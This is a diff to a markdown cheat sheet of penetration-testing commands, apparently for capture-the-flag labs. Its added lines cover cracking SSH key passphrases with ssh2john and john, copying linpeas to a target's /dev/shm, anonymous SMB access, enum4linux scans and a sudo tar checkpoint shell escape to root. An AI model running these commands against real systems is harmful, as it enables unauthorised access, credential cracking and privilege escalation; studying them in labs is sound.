@@ -12,6 +12,10 @@
 
 We can do ```ip addr show tun0``` or ```ifconfig```
 
+# Where to find all the usefull stuff in Kali linux:
+
+```/usr/share/```
+
 # Check if input allows python/python3
 
 We can do ```python -c "print('Hello')"``` or ```python3 -c "print('Hello')"```
@@ -28,7 +32,7 @@ We can use ```grep . file``` or ```while read line; do echo $line; done < file``
 
 # PORTS
 
-* **Check for open ports:** ```nmap [IP]``` [Guide](https://www.stationx.net/nmap-cheat-sheet/)
+* **Check for open ports:** ```nmap -sV -sC [IP] || nmap [IP]``` [Guide](https://www.stationx.net/nmap-cheat-sheet/)
 
 * **Types of ports and how to access them:** <br>
   * **Port 80:** Usually http
@@ -37,11 +41,23 @@ We can use ```grep . file``` or ```while read line; do echo $line; done < file``
       * ```ssh [USERNAME]@[IP]```
       * It will ask for a password:
         * We can try and crack the password like: ```hydra -l [USERNAME | WORDLIST] -P [PASSWORD | WORDLIST] [IP] ssh```
+    * If we find a private RSA key we can:
+      * Save it in our local machine
+      * Mark it as private: ```chmod 600 [keyfile]```
+      * Try to access it: ```ssh -i [keyfile] [user]@[IP]```
+      * If it asks for a passphrase:
+        * We can try and crack it like:
+          * Mark the RSA key as executable for john the ripper ```/usr/share/john/ssh2john.py [keyfile] > [newjohnfile]
+          * Brute-force it: ```john [newjohnfile] --wordlist=/usr/share/wordlists/rockyou.txt```
+    * Send a file to SSH: ```scp [FILE] [user]@[IP]:/dev/shm```
   * **Port 21:** Usually ftp
     * You can use the command ```ftp```
       * ```ftp [IP]```
         * It will ask for logging information but you can sometimes use: ```anonymous``` without password
         * You can retrieve files inside ftp using  ```get```: ```get flag.txt```
+  * **Port 445/139:** Usually SMB
+    * If the server is running SAMBA: ```smbclient //[IP]/anonymous``` 
+    * We can retrieve files using ```get [file]```
         
 # URL Directory Enumeration
 
@@ -64,12 +80,18 @@ We can use ```grep . file``` or ```while read line; do echo $line; done < file``
     3. ```stty raw -echo```
     4. ```fg```
     5. ```export TERM=xterm```
+
+# Enumerate a url
+
+If you want to find information about a url you can = ```enum4linux -A 10.10.158.249```
                     
 # Privilage Escalation
 
+* If you can send files or download files in the machine use linpeas 
+  * If you are on SSH:  ```scp linpeas.sh [user]@[IP]:/dev/shm```, ```./linpeas.sh | tee linpeas.txt```
 * If you are inside of the vulnerable system you can try to escalate your user privilege as root like:
   * Use ```sudo -l``` to see what types of privileges the user has.
-    * If you see ```(ALL : ALL) ALL```, just call ```sudo bash``` and you will become root.
+    * If you see ```(ALL : ALL) ALL```, just call ```sudo bash``` or ```sudo su``` and you will become root.
     * Other privileges: [Check for exploits](https://gtfobins.github.io/)
       * tar: ```sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
       
